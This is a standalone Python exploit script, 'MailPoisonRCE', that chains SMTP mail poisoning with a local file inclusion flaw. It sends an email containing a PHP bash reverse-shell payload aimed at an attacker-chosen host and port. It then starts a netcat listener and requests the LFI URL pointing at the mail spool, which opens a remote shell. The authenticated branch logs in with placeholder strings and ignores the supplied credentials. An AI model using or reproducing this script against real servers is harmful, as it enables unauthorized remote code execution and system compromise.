#!/usr/bin/env python3
import pyfiglet
import requests
import argparse
import smtplib
import socket, sys, time
import os
import threading

print(pyfiglet.figlet_format("MailPoisonRCE"))


print("Authenticated usage: python3 MailPoisonRCE.py -s 10.11.12.13 -sp 25 -e from@test.com -t test@rcpnt.com -i 127.0.0.1 -p 4444 -u http://10.11.12.13/index.php?page=../../../var/mail/test -us user -pw root ")
print("")
print("Unauthenticated usage: python3 MailPoisonRCE.py -s 10.11.12.13 -sp 25 -e from@test.com -t test@rcpnt.com -i 127.0.0.1 -p 4444 -u http://10.11.12.13/index.php?page=../../../var/mail/test")

parser = argparse.ArgumentParser()
parser.add_argument("-e", "--emlfrom", help="from email",nargs='?', const=1, type=str, required=True)
parser.add_argument("-t", "--torcpnt", help="recipient of email",nargs='?', const=1, type=str, required=True)
parser.add_argument("-i", "--lhost", help="listening host",nargs='?', const=1, type=str, required=True)
parser.add_argument("-p", "--lport", help="listening port", nargs='?', const=1, type=str, required=True)
parser.add_argument("-s", "--smtp", help="SMTP IP", nargs='?', const=1, type=str, required=True)
parser.add_argument("-sp", "--smtport", help="smtp port", nargs='?', const=1, type=str, required=True)
parser.add_argument("-u", "--url", help="LFI URL of smtp log file",nargs='?', const=1, type=str, required=True)
parser.add_argument("-us", "--user", help="smtp user",nargs='?', const=1, type=str)
parser.add_argument("-pw", "--passw", help="smtp pass",nargs='?', const=1, type=str)
args = parser.parse_args()

###### will send email from smtp
if args.user and args.passw:
	host = f"{args.smtp}"
	server = smtplib.SMTP(host,args.smtport)
	server.login("your username", "your password")
	FROM = f"{args.emlfrom}"
	TO = f"{args.torcpnt}"
	MSG = f'''<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1' ");?>'''
	server.sendmail(FROM, TO, MSG)
	server.quit()
	print('[+] Email sent successfully')
else:
	host = f"{args.smtp}"
	server = smtplib.SMTP(host,args.smtport)
	FROM = f"{args.emlfrom}"
	TO = f"{args.torcpnt}"
	MSG = f'''<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1' ");?>'''
	server.sendmail(FROM, TO, MSG)
	server.quit()
	print('[+] Email sent successfully')

def listen():
	os.system(f"nc -lvnp {args.lport}")

def send_req():
	response = requests.get(args.url)

if __name__ == "__main__":
	t1 = threading.Thread(target=listen, name='t1')
	t3 = threading.Thread(target=send_req, name='t1')
	t1.start()
	t3.start()
	t3.join()
	t1.join()